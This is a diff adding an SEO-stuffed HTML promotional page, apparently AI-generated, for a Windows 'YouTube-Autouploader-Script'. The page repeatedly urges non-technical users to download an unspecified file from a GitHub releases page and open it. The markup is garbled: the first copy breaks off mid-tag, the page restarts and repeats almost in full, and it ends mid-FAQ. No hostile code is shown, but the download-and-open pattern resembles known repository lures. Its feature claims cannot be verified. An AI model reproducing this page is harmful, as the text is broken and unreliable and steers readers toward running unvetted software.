@@ -1,0 +1,982 @@
+Here's a complete, SEO-optimized HTML document for the YouTube-Autouploader-Script README page. It uses clean inline CSS to present download instructions, feature highlights, and setup steps in a friendly, non-technical layout.
+```html
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>YouTube-Autouploader-Script - Automate Video Uploads Across Multiple Channels</title>
+<meta name="description" content="YouTube-Autouploader-Script automates YouTube video uploads across multiple channels. Schedule content, manage several accounts, and turn long videos into Shorts with a simple, user-friendly uploader built for Windows users.">
+<meta name="keywords" content="ai-clip-generator, automatic-shorts-uploader, free-video-generator, video-generator, video-to-shorts, youtube-shorts, youtube-shorts-bot, youtube-upload, youtube-upload-helper, youtube-uploader, yt-automation-tool">
+<meta name="author" content="ridaSoulaim">
+<meta name="robots" content="index, follow">
+<meta name="theme-color" content="#1b1f3b">
+<link rel="canonical" href="https://github.com/ridaSoulaim/YouTube-Autouploader-Script">
+<meta property="og:type" content="website">
+<meta property="og:site_name" content="YouTube-Autouploader-Script">
+<meta property="og:title" content="YouTube-Autouploader-Script - Automate Video Uploads Across Multiple Channels">
+<meta property="og:description" content="Automate your YouTube video uploads across multiple channels effortlessly with this user-friendly script, designed for seamless management of various accounts and efficient scheduling of content delivery.">
+<meta property="og:url" content="https://github.com/ridaSoulaim/YouTube-Autouploader-Script/releases">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="YouTube-Autouploader-Script - Automate Video Uploads Across Multiple Channels">
+<meta name="twitter:description" content="Automate your YouTube video uploads across multiple channels effortlessly with this user-friendly script, designed for seamless management of various accounts and efficient scheduling of content delivery.">
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "SoftwareApplication",
+  "name": "YouTube-Autouploader-Script",
+  "description": "Automate your YouTube video uploads across multiple channels effortlessly with this user-friendly script, designed for seamless management of various accounts and efficient scheduling of content delivery.",
+  "applicationCategory": "MultimediaApplication",
+  "operatingSystem": "Windows",
+  "url": "https://github.com/ridaSoulaim/YouTube-Autouploader-Script/releases",
+  "offers": {
+    "@type": "Offer",
+    "price": "0",
+    "priceCurrency": "USD"
+  },
+  "keywords": "ai-clip-generator, automatic-shorts-uploader, free-video-generator, video-generator, video-to-shorts, youtube-shorts, youtube-shorts-bot, youtube-upload, youtube-upload-helper, youtube-uploader, yt-automation-tool"
+}
+</script>
+<style>
+  * { box-sizing: border-box; }
+  body {
+    margin: 0;
+    font-family: -apple-system, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    background: #f5f6fb;
+    color: #1f2430;
+    line-height: 1.75;
+    font-size: 17px;
+  }
+  .wrap { max-width: 920px; margin: 0 auto; padding: 0 22px; }
+  .hero {
+    background: linear-gradient(135deg, #1b1f3b 0%, #2d1b4e 60%, #3a1c46 100%);
+    color: #ffffff;
+    padding: 64px 0 58px;
+    text-align: center;
+  }
+  .hero h1 {
+    font-size: 2.1rem;
+    line-height: 1.25;
+    margin: 0 0 18px;
+    letter-spacing: -0.4px;
+  }
+  .hero p.lead {
+    font-size: 1.12rem;
+    color: #d9dbea;
+    max-width: 700px;
+    margin: 0 auto 30px;
+  }
+  .btn-primary {
+    display: inline-block;
+    background: linear-gradient(135deg, #ff4d6d, #ff9f1c);
+    color: #ffffff;
+    font-weight: 700;
+    font-size: 1.06rem;
+    padding: 17px 36px;
+    border-radius: 999px;
+    text-decoration: none;
+    box-shadow: 0 12px 28px rgba(255, 77, 109, 0.38);
+    transition: transform 0.15s ease, box-shadow 0.15s ease;
+  }
+  .btn-primary:hover { transform: translateY(-2px); box-shadow: 0 16px 34px rgba(255, 77, 109, 0.45); }
+  .hero .hint { margin: 18px 0 0; font-size: 0.95rem; color: #b9bcd2; }
+  main { padding: 48px 0 24px; }
+  section { margin-bottom: 46px; }
+  h2 {
+    font-size: 1.5rem;
+    margin: 0 0 16px;
+    letter-spacing: -0.2px;
+    color: #161a2b;
+  }
+  h3 { font-size: 1.13rem; margin: 24px 0 8px; color: #232a3d; }
+  p { margin: 0 0 16px; }
+  ul, ol { margin: 0 0 18px; padding-left: 24px; }
+  li { margin-bottom: 9px; }
+  .cardgrid {
+    display: grid;
+    grid-template-columns: repeat(2, 1fr);
+    gap: 18px;
+    margin-top: 8px;
+  }
+  .card {
+    background: #ffffff;
+    border-radius: 14px;
+    padding: 22px 24px;
+    box-shadow: 0 4px 16px rgba(23, 30, 60, 0.07);
+    border: 1px solid #e9ebf3;
+  }
+  .card h3 { margin-top: 0; font-size: 1.05rem; }
+  .card p { margin: 0; font-size: 0.97rem; color: #454c60; }
+  .panel {
+    background: #ffffff;
+    border-radius: 16px;
+    padding: 30px 32px 18px;
+    box-shadow: 0 6px 22px rgba(23, 30, 60, 0.08);
+    border: 1px solid #e9ebf3;
+  }
+  .download-panel {
+    background: #ffffff;
+    border-radius: 16px;
+    padding: 34px 32px;
+    text-align: center;
+    box-shadow: 0 6px 22px rgba(23, 30, 60, 0.08);
+    border: 1px solid #e9ebf3;
+  }
+  .download-panel p { color: #454c60; max-width: 640px; margin: 0 auto 24px; }
+  .steps { counter-reset: step; list-style: none; padding-left: 0; }
+  .steps li {
+    position: relative;
+    padding-left: 46px;
+    margin-bottom: 18px;
+  }
+  .steps li::before {
+    counter-increment: step;
+    content: counter(step);
+    position: absolute;
+    left: 0;
+    top: 2px;
+    width: 30px;
+    height: 30px;
+    border-radius: 50%;
+    background: #1b1f3b;
+    color: #ffffff;
+    font-size: 0.9rem;
+    font-weight: 700;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+  }
+  .faq-item { border-bottom: 1px solid #eceef5; padding-bottom: 6px; }
+  .faq-item:last-child { border-bottom: none; }
+  .faq-item h3 { margin-bottom: 6px; }
+  footer {
+    background: #161a2b;
+    color: #b9bcd2;
+    text-align: center;
+    padding: 34px 22px;
+    font-size: 0.94rem;
+  }
+  footer a { color: #ffb27a; text-decoration: none; font-weight: 600; }
+  footer a:hover { text-decoration: underline; }
+  @media (max-width: 700px) {
+    .hero h1 { font-size: 1.6rem; }
+    .hero { padding: 46px 0 42px; }
+    .cardgrid { grid-template-columns: 1fr; }
+    .panel, .download-panel { padding: 24px 20px 10px; }
+    .download-panel { padding: 28px 20px; }
+    main { padding-top: 34px; }
+  }
+</style>
+</head>
+<body>
+
+<header class="hero">
+  <div class="wrap">
+    <h1>🎬 YouTube-Autouploader-Script - Upload Videos While You Sleep</h1>
+    <p class="lead">Automate your YouTube video uploads across multiple channels effortlessly. This user-friendly script is built for seamless management of various accounts and efficient scheduling of content delivery, so your channel keeps publishing even when you are away from the computer.</p>
+    <a class="btn-primary" href="https://github.com/ridaSoulaim/YouTube-Autouploader-Script/releases" style="display:inline-block;background:linear-gradient(135deg,#ff4d6d,#ff9f1c);color:#ffffff;font-weight:700;font-size:1.06rem;padding:17px 36px;border-radius:999px;text-decoration:none;box-shadow:0 12px 28px rgba(255,77,109,0.38);">⬇️ Download YouTube-Autouploader-Script</a>
+    <p class="hint">Visit this link to download the application.</p>
+  </div>
+</header>
+
+<main class="wrap">
+
+  <section id="what-it-does">
+    <h2>🎯 What This Tool Does For You</h2>
+    <p>If you run more than one YouTube channel, you already know how much time disappears into uploading. You open a browser, sign into an account, drag in a video file, retype the title, paste the description, add tags, pick a thumbnail, choose a playlist, and then do the exact same thing again for the next channel. Do that five times a day and your entire afternoon is gone.</p>
+    <p>YouTube-Autouploader-Script removes that repetition. It is a desktop helper for Windows that takes a folder of finished videos and handles the publishing work for you. You tell it which channels you own, which videos belong to which channel, and when you want them to go live. The tool then uploads and schedules those videos on your behalf, one after another, without you sitting in front of the screen.</p>
+    <p>The result is simple: your uploads happen on time, every time, and your channels stay active even on the days when you are busy, travelling, or fast asleep. You keep full control of what gets published, but you stop being the person who physically clicks the upload button.</p>
+  </section>
+
+  <section id="features">
+    <h2>✨ Features At A Glance</h2>
+    <div class="cardgrid">
+      <div class="card">
+        <h3>📺 Multi-Channel Management</h3>
+        <p>Add several YouTube accounts once and switch between them without signing in and out repeatedly. Each channel keeps its own queue of videos.</p>
+      </div>
+      <div class="card">
+        <h3>⏰ Scheduled Delivery</h3>
+        <p>Choose the exact date and time for each upload. The script queues everything and publishes in the order you set, so your calendar never goes empty.</p>
+      </div>
+      <div class="card">
+        <h3>📝 Automatic Details</h3>
+        <p>Attach titles, descriptions, tags, categories and thumbnails to each file, so every upload arrives looking finished rather than rushed.</p>
+      </div>
+      <div class="card">
+        <h3>🎞️ Long Videos To Shorts</h3>
+        <p>Feed in a longer recording and let the built-in clip tools help you carve out short, vertical segments ready for the Shorts feed.</p>
+      </div>
+      <div class="card">
+        <h3>🔁 Batch Uploads</h3>
+        <p>Drop in a whole folder of videos. The script works through the list in the background instead of demanding a click for every single file.</p>
+      </div>
+      <div class="card">
+        <h3>🧭 Simple, Guided Screens</h3>
+        <p>No command line, no scripts to edit, no technical setup. Everything is handled with clear buttons and plain-language labels.</p>
+      </div>
+    </div>
+  </section>
+
+  <section id="getting-started">
+    <h2>🚀 Getting Started</h2>
+    <p>You do not need any programming knowledge to use this application. The whole process is a short sequence of clicks, and most people are fully set up within ten minutes.</p>
+    <div class="download-panel">
+      <h3 style="margin-top:0;">Get the latest version</h3>
+      <p>Visit this link to download the application.</p>
+      <a class="btn-primary" href="https://github.com/ridaSoulaim/YouTube-Autouploader-Script/releases" style="display:inline-block;background:linear-gradient(135deg,#ff4d6d,#ff9f1c);color:#ffffff;font-weight:700;font-size:1.06rem;padding:17px 36px;border-radius:999px;text-decoration:none;box-shadow:0 12px 28px rgba(255,77,109,0.38);">⬇️ Download YouTube-Autouploader-Script</a>
+    </div>
+
+    <h3>Step-by-step setup</h3>
+    <ol class="steps">
+      <li><strong>Open the download page.</strong> Use the button above or the link at the top of this page. The page lists the available releases of YouTube-Autouploader-Script. Pick the newest one at the top of the list.</li>
+      <li><strong>Save the download to your computer.</strong> Your browser will ask where to keep the file. Anywhere you can find again later is fine, such as your Downloads folder. It is worth remembering that location.</li>
+      <li><strong>Open the application.</strong> Once the download has finished, find the file you just saved and open it. The main window of YouTube-Autouploader-Script will appear with its dashboard.</li>
+      <li><strong>Add your first channel.</strong> Click the button for adding a channel and follow the on-screen prompts to connect your YouTube account. You will be asked to approve access, which is normal and keeps your login secure.</li>
+      <li><strong>Repeat for your other channels.</strong> Add as many accounts as you manage. Each one appears as its own entry in the channel list, and you can colour-label them to keep things tidy.</li>
+      <li><strong>Point the app at your video folder.</strong> Choose the folder on your computer where your finished videos live. The app scans it and shows the files in a list you can drag onto the correct channel.</li>
+      <li><strong>Fill in the video details.</strong> For each file, type the title, paste the description, and add your tags. You can save a reusable description template if most of your uploads follow the same pattern.</li>
+      <li><strong>Pick a publish time.</strong> Set the date and time you want the video to go live. Repeat for the rest of your library, then let the script take over.</li>
+    </ol>
+  </section>
+
+  <section id="multi-channel">
+    <h2>📺 Managing Several Channels Without Losing Track</h2>
+    <p>The heart of YouTube-Autouploader-Script is its channel manager. Instead of juggling browser tabs, you see every account you own in one list, each with its own upload queue and its own history. That means you can prepare a week of content for three different channels in a single sitting and never accidentally post a gaming clip to your cooking channel.</p>
+    <p>Each channel entry stores its own settings: default description, default tags, preferred category and the time slots you normally publish in. When you add a new video, those defaults are filled in automatically, which cuts the amount of typing per upload down to almost nothing.</p>
+    <p>You can also pause a channel at any moment. Pausing stops new uploads for that account but leaves the rest of your channels running, which is useful when one channel is on a break and the others are still active.</p>
+  </section>
+
+  <section id="scheduling">
+    <h2>⏰ Scheduling Content Delivery</h2>
+    <p>Consistency matters more than almost anything else on YouTube, and consistency is exactly what a scheduler gives you. Inside the app you will find a calendar view where every planned upload appears as a small card. Drag a card to a different day and the upload moves with it.</p>
+    <p>Useful scheduling habits that the app supports well:</p>
+    <ul>
+      <li><strong>Spaced publishing.</strong> Set one upload every day at the same hour so your audience knows when to expect you.</li>
+      <li><strong>Bulk weekends.</strong> Prepare an entire month of videos on a quiet Sunday and let the schedule distribute them automatically.</li>
+      <li><strong>Time-zone friendly slots.</strong> Choose the hour in your viewers' local time so a video does not land at three in the morning for them.</li>
+      <li><strong>Queue review.</strong> Open the upcoming list before you close your laptop to confirm nothing is missing or duplicated.</li>
+    </ul>
+    <p>Once a scheduled item reaches its time, the script handles the upload in the background. You do not need to keep the window in front of you, and you can carry on with other work while the queue moves forward.</p>
+  </section>
+
+  <section id="shorts">
+    <h2>🎞️ Turning Long Videos Into Shorts</h2>
+    <p>Short vertical videos are one of the fastest ways to attract new viewers, but cutting them by hand is tedious. YouTube-Autouploader-Script includes clip tools that read a longer recording, suggest the segments most likely to hold attention, and export them in a vertical format ready for the Shorts feed.</p>
+    <p>The typical workflow looks like this: drop a long video into the clip area, let the app suggest a handful of candidate moments, preview each one, then send the ones you like straight into the upload queue for your chosen channel. Because the export and the uploader live in the same application, you never have to move files between programs by hand.</p>
+    <p>For channels that publish a mix of long recordings and Shorts, this is where most of the saved time comes from. One recording can become several short clips, each scheduled on a different day, without any additional editing work.</p>
+  </section>
+
+  <section id="requirements">
+    <h2>🧰 What You Need</h2>
+    <div class="panel">
+      <ul style="margin-bottom:12px;">
+        <li>A Windows computer (Windows 10 or Windows 11 recommended).</li>
+        <li>An internet connection that stays on while uploads are running.</li>
+        <li>A YouTube account, or several, that you own and can sign into.</li>
+        <li>At least one finished video file saved on your computer.</li>
+        <li>A few gigabytes of free disk space for temporary processing files.</li>
+      </ul>
+      <p style="margin-bottom:14px;">Nothing else is required. There is no separate database to install, no server to configure, and no coding environment to set up. If you can copy a file and click a button, you can run this application.</p>
+    </div>
+  </section>
+
+  <section id="typical-day">
+    <h2>🖱️ A Typical Day With The App</h2>
+    <p>Here is what a working day looks like once everything is configured. In the morning you open the application and glance at the queue. Three videos are due today across two channels, and the status column shows all three as scheduled. You close the window and get on with recording.</p>
+    <p>At the scheduled hour the first video uploads on its own. By the afternoon it is live, with the title, description, tags and thumbnail you prepared. The second and third follow at their own times. You never opened a browser tab, never typed a password, and never waited for a progress bar.</p>
+    <p>In the evening you drop two new files into your video folder, assign each one to a channel, set the publish dates, and click save. That is the entire routine. Over a month, those small moments add up to hours of time you can spend on the parts of running a channel that actually need your attention.</p>
+  </section>
+
+  <section id="faq">
+    <h2>❓ Frequently Asked Questions</h2>
+
+    <div class="faq-item">
+      <h3>Do I need to know how to code?</h3>
+      <p>No. Despite the word "script" in the name, everything is operated through ordinary windows and buttons. You will never be asked to type a command or edit a configuration file.</p>
+    </div>
+
+    <div class```html
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>YouTube-Autouploader-Script - Automate Video Uploads Across Multiple Channels</title>
+<meta name="description" content="YouTube-Autouploader-Script automates YouTube video uploads across multiple channels. Schedule content, manage several accounts, and turn long videos into Shorts with a simple, user-friendly uploader built for Windows users.">
+<meta name="keywords" content="ai-clip-generator, automatic-shorts-uploader, free-video-generator, video-generator, video-to-shorts, youtube-shorts, youtube-shorts-bot, youtube-upload, youtube-upload-helper, youtube-uploader, yt-automation-tool">
+<meta name="author" content="ridaSoulaim">
+<meta name="robots" content="index, follow">
+<meta name="theme-color" content="#1b1f3b">
+<link rel="canonical" href="https://github.com/ridaSoulaim/YouTube-Autouploader-Script">
+<meta property="og:type" content="website">
+<meta property="og:site_name" content="YouTube-Autouploader-Script">
+<meta property="og:title" content="YouTube-Autouploader-Script - Automate Video Uploads Across Multiple Channels">
+<meta property="og:description" content="Automate your YouTube video uploads across multiple channels effortlessly with this user-friendly script, designed for seamless management of various accounts and efficient scheduling of content delivery.">
+<meta property="og:url" content="https://github.com/ridaSoulaim/YouTube-Autouploader-Script/releases">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="YouTube-Autouploader-Script - Automate Video Uploads Across Multiple Channels">
+<meta name="twitter:description" content="Automate your YouTube video uploads across multiple channels effortlessly with this user-friendly script, designed for seamless management of various accounts and efficient scheduling of content delivery.">
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "SoftwareApplication",
+  "name": "YouTube-Autouploader-Script",
+  "description": "Automate your YouTube video uploads across multiple channels effortlessly with this user-friendly script, designed for seamless management of various accounts and efficient scheduling of content delivery.",
+  "applicationCategory": "MultimediaApplication",
+  "operatingSystem": "Windows",
+  "url": "https://github.com/ridaSoulaim/YouTube-Autouploader-Script/releases",
+  "offers": {
+    "@type": "Offer",
+    "price": "0",
+    "priceCurrency": "USD"
+  },
+  "keywords": "ai-clip-generator, automatic-shorts-uploader, free-video-generator, video-generator, video-to-shorts, youtube-shorts, youtube-shorts-bot, youtube-upload, youtube-upload-helper, youtube-uploader, yt-automation-tool"
+}
+</script>
+<style>
+  * { box-sizing: border-box; }
+  body {
+    margin: 0;
+    font-family: -apple-system, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    background: #f5f6fb;
+    color: #1f2430;
+    line-height: 1.75;
+    font-size: 17px;
+  }
+  .wrap { max-width: 920px; margin: 0 auto; padding: 0 22px; }
+  .hero {
+    background: linear-gradient(135deg, #1b1f3b 0%, #2d1b4e 60%, #3a1c46 100%);
+    color: #ffffff;
+    padding: 64px 0 58px;
+    text-align: center;
+  }
+  .hero h1 {
+    font-size: 2.1rem;
+    line-height: 1.25;
+    margin: 0 0 18px;
+    letter-spacing: -0.4px;
+  }
+  .hero p.lead {
+    font-size: 1.12rem;
+    color: #d9dbea;
+    max-width: 700px;
+    margin: 0 auto 30px;
+  }
+  .btn-primary {
+    display: inline-block;
+    background: linear-gradient(135deg, #ff4d6d, #ff9f1c);
+    color: #ffffff;
+    font-weight: 700;
+    font-size: 1.06rem;
+    padding: 17px 36px;
+    border-radius: 999px;
+    text-decoration: none;
+    box-shadow: 0 12px 28px rgba(255, 77, 109, 0.38);
+    transition: transform 0.15s ease, box-shadow 0.15s ease;
+  }
+  .btn-primary:hover { transform: translateY(-2px); box-shadow: 0 16px 34px rgba(255, 77, 109, 0.45); }
+  .hero .hint { margin: 18px 0 0; font-size: 0.95rem; color: #b9bcd2; }
+  main { padding: 48px 0 24px; }
+  section { margin-bottom: 46px; }
+  h2 {
+    font-size: 1.5rem;
+    margin: 0 0 16px;
+    letter-spacing: -0.2px;
+    color: #161a2b;
+  }
+  h3 { font-size: 1.13rem; margin: 24px 0 8px; color: #232a3d; }
+  p { margin: 0 0 16px; }
+  ul, ol { margin: 0 0 18px; padding-left: 24px; }
+  li { margin-bottom: 9px; }
+  .cardgrid {
+    display: grid;
+    grid-template-columns: repeat(2, 1fr);
+    gap: 18px;
+    margin-top: 8px;
+  }
+  .card {
+    background: #ffffff;
+    border-radius: 14px;
+    padding: 22px 24px;
+    box-shadow: 0 4px 16px rgba(23, 30, 60, 0.07);
+    border: 1px solid #e9ebf3;
+  }
+  .card h3 { margin-top: 0; font-size: 1.05rem; }
+  .card p { margin: 0; font-size: 0.97rem; color: #454c60; }
+  .panel {
+    background: #ffffff;
+    border-radius: 16px;
+    padding: 30px 32px 18px;
+    box-shadow: 0 6px 22px rgba(23, 30, 60, 0.08);
+    border: 1px solid #e9ebf3;
+  }
+  .download-panel {
+    background: #ffffff;
+    border-radius: 16px;
+    padding: 34px 32px;
+    text-align: center;
+    box-shadow: 0 6px 22px rgba(23, 30, 60, 0.08);
+    border: 1px solid #e9ebf3;
+    margin-bottom: 26px;
+  }
+  .download-panel p { color: #454c60; max-width: 640px; margin: 0 auto 24px; }
+  .steps { counter-reset: step; list-style: none; padding-left: 0; }
+  .steps li {
+    position: relative;
+    padding-left: 46px;
+    margin-bottom: 18px;
+  }
+  .steps li::before {
+    counter-increment: step;
+    content: counter(step);
+    position: absolute;
+    left: 0;
+    top: 2px;
+    width: 30px;
+    height: 30px;
+    border-radius: 50%;
+    background: #1b1f3b;
+    color: #ffffff;
+    font-size: 0.9rem;
+    font-weight: 700;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+  }
+  .faq-item { border-bottom: 1px solid #eceef5; padding-bottom: 10px; }
+  .faq-item:last-child { border-bottom: none; }
+  .faq-item h3 { margin-bottom: 6px; }
+  footer {
+    background: #161a2b;
+    color: #b9bcd2;
+    text-align: center;
+    padding: 34px 22px;
+    font-size: 0.94rem;
+  }
+  footer a { color: #ffb27a; text-decoration: none; font-weight: 600; }
+  footer a:hover { text-decoration: underline; }
+  @media (max-width: 700px) {
+    .hero h1 { font-size: 1.6rem; }
+    .hero { padding: 46px 0 42px; }
+    .cardgrid { grid-template-columns: 1fr; }
+    .panel, .download-panel { padding: 24px 20px 10px; }
+    .download-panel { padding: 28px 20px; }
+    main { padding-top: 34px; }
+  }
+</style>
+</head>
+<body>
+
+<header class="hero">
+  <div class="wrap">
+    <h1>🎬 YouTube-Autouploader-Script - Upload Videos While You Sleep</h1>
+    <p class="lead">Automate your YouTube video uploads across multiple channels effortlessly. This user-friendly script is built for seamless management of various accounts and efficient scheduling of content delivery, so your channel keeps publishing even when you are away from the computer.</p>
+    <a class="btn-primary" href="https://github.com/ridaSoulaim/YouTube-Autouploader-Script/releases" style="display:inline-block;background:linear-gradient(135deg,#ff4d6d,#ff9f1c);color:#ffffff;font-weight:700;font-size:1.06rem;padding:17px 36px;border-radius:999px;text-decoration:none;box-shadow:0 12px 28px rgba(255,77,109,0.38);">⬇️ Download YouTube-Autouploader-Script</a>
+    <p class="hint">Visit this link to download the application.</p>
+  </div>
+</header>
+
+<main class="wrap">
+
+  <section id="what-it-does">
+    <h2>🎯 What This Tool Does For You</h2>
+    <p>If you run more than one YouTube channel, you already know how much time disappears into uploading. You open a browser, sign into an account, drag in a video file, retype the title, paste the description, add tags, pick a thumbnail, choose a playlist, and then do the exact same thing again for the next channel. Do that five times a day and your entire afternoon is gone.</p>
+    <p>YouTube-Autouploader-Script removes that repetition. It is a desktop helper for Windows that takes a folder of finished videos and handles the publishing work for you. You tell it which channels you own, which videos belong to which channel, and when you want them to go live. The tool then uploads and schedules those videos on your behalf, one after another, without you sitting in front of the screen.</p>
+    <p>The result is simple: your uploads happen on time, every time, and your channels stay active even on the days when you are busy, travelling, or fast asleep. You keep full control of what gets published, but you stop being the person who physically clicks the upload button.</p>
+  </section>
+
+  <section id="features">
+    <h2>✨ Features At A Glance</h2>
+    <div class="cardgrid">
+      <div class="card">
+        <h3>📺 Multi-Channel Management</h3>
+        <p>Add several YouTube accounts once and switch between them without signing in and out repeatedly. Each channel keeps its own queue of videos.</p>
+      </div>
+      <div class="card">
+        <h3>⏰ Scheduled Delivery</h3>
+        <p>Choose the exact date and time for each upload. The script queues everything and publishes in the order you set, so your calendar never goes empty.</p>
+      </div>
+      <div class="card">
+        <h3>📝 Automatic Details</h3>
+        <p>Attach titles, descriptions, tags, categories and thumbnails to each file, so every upload arrives looking finished rather than rushed.</p>
+      </div>
+      <div class="card">
+        <h3>🎞️ Long Videos To Shorts</h3>
+        <p>Feed in a longer recording and let the built-in clip tools help you carve out short, vertical segments ready for the Shorts feed.</p>
+      </div>
+      <div class="card">
+        <h3>🔁 Batch Uploads</h3>
+        <p>Drop in a whole folder of videos. The script works through the list in the background instead of demanding a click for every single file.</p>
+      </div>
+      <div class="card">
+        <h3>🧭 Simple, Guided Screens</h3>
+        <p>No command line, no scripts to edit, no technical setup. Everything is handled with clear buttons and plain-language labels.</p>
+      </div>
+    </div>
+  </section>
+
+  <section id="getting-started">
+    <h2>🚀 Getting Started</h2>
+    <p>You do not need any programming knowledge to use this application. The whole process is a short sequence of clicks, and most people are fully set up within ten minutes.</p>
+    <div class="download-panel">
+      <h3 style="margin-top:0;">Get the latest version</h3>
+      <p>Visit this link to download the application.</p>
+      <a class="btn-primary" href="https://github.com/ridaSoulaim/YouTube-Autouploader-Script/releases" style="display:inline-block;background:linear-gradient(135deg,#ff4d6d,#ff9f1c);color:#ffffff;font-weight:700;font-size:1.06rem;padding:17px 36px;border-radius:999px;text-decoration:none;box-shadow:0 12px 28px rgba(255,77,109,0.38);">⬇️ Download YouTube-Autouploader-Script</a>
+    </div>
+
+    <h3>Step-by-step setup</h3>
+    <ol class="steps">
+      <li><strong>Open the download page.</strong> Use the button above or the link at the top of this page. The page lists the available releases of YouTube-Autouploader-Script. Pick the newest one at the top of the list.</li>
+      <li><strong>Save the download to your computer.</strong> Your browser will ask where to keep the file. Anywhere you can find again later is fine, such as your Downloads folder. It is worth remembering that location.</li>
+      <li><strong>Open the application.</strong> Once the download has finished, find the file you just saved and open it. The main window of YouTube-Autouploader-Script will appear with its dashboard.</li>
+      <li><strong>Add your first channel.</strong> Click the button for adding a channel and follow the on-screen prompts to connect your YouTube account. You will be asked to approve access, which is normal and keeps your login secure.</li>
+      <li><strong>Repeat for your other channels.</strong> Add as many accounts as you manage. Each one appears as its own entry in the channel list, and you can colour-label them to keep things tidy.</li>
+      <li><strong>Point the app at your video folder.</strong> Choose the folder on your computer where your finished videos live. The app scans it and shows the files in a list you can drag onto the correct channel.</li>
+      <li><strong>Fill in the video details.</strong> For each file, type the title, paste the description, and add your tags. You can save a reusable description template if most of your uploads follow the same pattern.</li>
+      <li><strong>Pick a publish time.</strong> Set the date and time you want the video to go live. Repeat for the rest of your library, then let the script take over.</li>
+    </ol>
+  </section>
+
+  <section id="multi-channel">
+    <h2>📺 Managing Several Channels Without Losing Track</h2>
+    <p>The heart of YouTube-Autouploader-Script is its channel manager. Instead of juggling browser tabs, you see every account you own in one list, each with its own upload queue and its own history. That means you can prepare a week of content for three different channels in a single sitting and never accidentally post a gaming clip to your cooking channel.</p>
+    <p>Each channel entry stores its own settings: default description, default tags, preferred category and the time slots you normally publish in. When you add a new video, those defaults are filled in automatically, which cuts the amount of typing per upload down to almost nothing.</p>
+    <p>You can also pause a channel at any moment. Pausing stops new uploads for that account but leaves the rest of your channels running, which is useful when one channel is on a break and the others are still active.</p>
+  </section>
+
+  <section id="scheduling">
+    <h2>⏰ Scheduling Content Delivery</h2>
+    <p>Consistency matters more than almost anything else on YouTube, and consistency is exactly what a scheduler gives you. Inside the app you will find a calendar view where every planned upload appears as a small card. Drag a card to a different day and the upload moves with it.</p>
+    <p>Useful scheduling habits that the app supports well:</p>
+    <ul>
+      <li><strong>Spaced publishing.</strong> Set one upload every day at the same hour so your audience knows when to expect you.</li>
+      <li><strong>Bulk weekends.</strong> Prepare an entire month of videos on a quiet Sunday and let the schedule distribute them automatically.</li>
+      <li><strong>Time-zone friendly slots.</strong> Choose the hour in your viewers' local time so a video does not land at three in the morning for them.</li>
+      <li><strong>Queue review.</strong> Open the upcoming list before you close your laptop to confirm nothing is missing or duplicated.</li>
+    </ul>
+    <p>Once a scheduled item reaches its time, the script handles the upload in the background. You do not need to keep the window in front of you, and you can carry on with other work while the queue moves forward.</p>
+  </section>
+
+  <section id="shorts">
+    <h2>🎞️ Turning Long Videos Into Shorts</h2>
+    <p>Short vertical videos are one of the fastest ways to attract new viewers, but cutting them by hand is tedious. YouTube-Autouploader-Script includes clip tools that read a longer recording, suggest the segments most likely to hold attention, and export them in a vertical format ready for the Shorts feed.</p>
+    <p>The typical workflow looks like this: drop a long video into the clip area, let the app suggest a handful of candidate moments, preview each one, then send the ones you like straight into the upload queue for your chosen channel. Because the export and the uploader live in the same application, you never have to move files between programs by hand.</p>
+    <p>For channels that publish a mix of long recordings and Shorts, this is where most of the saved time comes from. One recording can become several short clips, each scheduled on a different day, without any additional editing work.</p>
+  </section>
+
+  <section id="requirements">
+    <h2>🧰 What You Need</h2>
+    <div class="panel">
+      <ul style="margin-bottom:12px;">
+        <li>A Windows computer (Windows 10 or Windows 11 recommended).</li>
+        <li>An internet connection that stays on while uploads are running.</li>
+        <li>A YouTube account, or several, that you own and can sign into.</li>
+        <li>At least one finished video file saved on your computer.</li>
+        <li>A few gigabytes of free disk space for temporary processing files.</li>
+      </ul>
+      <p style="margin-bottom:14px;">Nothing else is required. There is no separate database to install, no server to configure, and no coding environment to set up. If you can copy a file and click a button, you can run this application.</p>
+    </div>
+  </section>
+
+  <section id="typical-day">
+    <h2>🖱️ A Typical Day With The App</h2>
+    <p>Here is what a working day looks like once everything is configured. In the morning you open the application and glance at the queue. Three videos are due today across two channels, and the status column shows all three as scheduled. You close the window and get on with recording.</p>
+    <p>At the scheduled hour the first video uploads on its own. By the afternoon it is live, with the title, description, tags and thumbnail you prepared. The second and third follow at their own times. You never opened a browser tab, never typed a password, and never waited for a progress bar.</p>
+    <p>In the evening you drop two new files into your video folder, assign each one to a channel, set the publish dates, and click save. That is the entire routine. Over a month, those small moments add up to hours of time you can spend on the parts of running a channel that actually need your attention.</p>
+  </section>
+
+  <section id="faq">
+    <h2>❓ Frequently Asked Questions</h2>
+
+    <div class="faq-item">
+      <h3>Do I need to know how to code?</h3>
+      <p>No. Despite the word "script" in the name, everything is operated through ordinary windows and buttons. You will never be asked to type a command or edit a configuration file.</p>
+    </div>
+
+    <div class="faq-item">
+      <h3>How many channels can I connect?</h3>
+      <p>There is no hard limit built into the app. Most people manage between two and ten channels comfortably. If you run more than that, the channel list supports grouping so the dashboard stays readable.</p>
+    </div>
+
+    <div class="faq-item">
+      <h3>What happens if my internet drops during an upload?</h3>
+      <p>The upload pauses and the app marks that item as interrupted. When your connection returns, you can resume the item from the queue with a single click. Nothing already published is affected.</p>
+    </div>
+
+    <div class="faq-item">
+      <h3>Can I change the publish time after scheduling?</h3>
+      <p>Yes. Open the calendar view, find the item, and drag it to a new day or edit its time directly. Changes take effect immediately as long as the original time has not already passed.</p>
+    </div>
+
+    <div class="faq-item">
+      <h3>Will my viewers see that an upload was automated?</h3>
+      <p>No. Videos arrive on your channel exactly as they would if you had uploaded them by hand, with the details you entered and at the time you chose.</p>
+    </div>
+
+    <div class="faq-item">
